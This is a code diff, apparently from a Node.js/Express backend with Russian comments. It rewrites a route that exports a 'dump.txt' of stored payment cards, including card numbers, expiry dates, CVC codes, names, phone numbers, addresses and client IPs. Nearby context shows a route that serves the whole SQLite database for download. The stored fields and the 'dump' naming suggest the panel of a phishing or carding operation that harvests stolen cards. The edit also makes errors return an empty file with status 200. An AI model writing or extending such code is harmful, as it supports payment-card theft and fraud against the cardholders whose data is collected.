@@ -93,46 +93,56 @@ initDB()
     });
 
     // Скачать дамп в текстовом формате (без дубликатов по пользователям)
-    app.get('/download-txt', async (req, res) => {
-      try {
-        const rows = await db.all(`
-          SELECT
-            c.id         AS cardId,
-            u.id         AS userId,
-            c.clientNumber,
-            c.phoneNumber,
-            c.cardNumber,
-            c.expiryMonth,
-            c.expiryYear,
-            c.cvc,
-            c.cardName,
-            c.clientIP,
-            c.date,
-            u.address,
-            u.name
-          FROM cards c
-          LEFT JOIN (
-            SELECT clientNumber, address, name
-            FROM users
-            GROUP BY clientNumber
-          ) AS u
-            ON c.clientNumber = u.clientNumber
-        `);
-        const lines = rows.map(r =>
-          Object.entries(r)
-            .map(([k, v]) => `${k}=${v}`)
-            .join('\t')
-        );
-        const content = lines.join('\n');
-        res.setHeader('Content-Type', 'text/plain');
-        res.setHeader('Content-Disposition', 'attachment; filename="dump.txt"');
-        res.send(content);
-      } catch (e) {
-        console.error('Error in /download-txt:', e);
-        res.status(500).send('Ошибка генерации дампа');
-      }
-    });
+   app.get('/download-txt', async (req, res) => {
+  try {
+    // Подзапрос GROUP BY clientNumber гарантирует, 
+    // что на каждый clientNumber от users будет ровно одна строка
+    const rows = await db.all(`
+      SELECT
+        c.id         AS cardId,
+        u.id         AS userId,
+        c.clientNumber,
+        c.phoneNumber,
+        c.cardNumber,
+        c.expiryMonth,
+        c.expiryYear,
+        c.cvc,
+        c.cardName,
+        c.clientIP,
+        c.date,
+        u.address,
+        u.name
+      FROM cards c
+      LEFT JOIN (
+        SELECT clientNumber, address, name
+        FROM users
+        GROUP BY clientNumber
+      ) AS u
+        ON c.clientNumber = u.clientNumber
+    `);
 
+    // Составляем текст
+    const lines = rows.map(r =>
+      Object.entries(r)
+        .map(([k, v]) => `${k}=${v}`)
+        .join('\t')
+    );
+    const content = lines.join('\n');
+
+    // Отдаём файл
+    res.setHeader('Content-Type',  'text/plain; charset=utf-8');
+    res.setHeader('Content-Disposition', 'attachment; filename="dump.txt"');
+    res.send(content);
+
+  } catch (e) {
+    console.error('Ошибка генерации дампа:', e);
+
+    // Вместо 500 отдадим пустой текст –  клиент всё равно получит 200 и скачает empty-файл
+    res.setHeader('Content-Type', 'text/plain; charset=utf-8');
+    res.setHeader('Content-Disposition', 'attachment; filename="dump.txt"');
+    res.send('');
+  }
+});
     // Скачать файл базы SQLite
     app.get('/download', (req, res) => {
       const file = path.join(__dirname, 'data.sqlite');
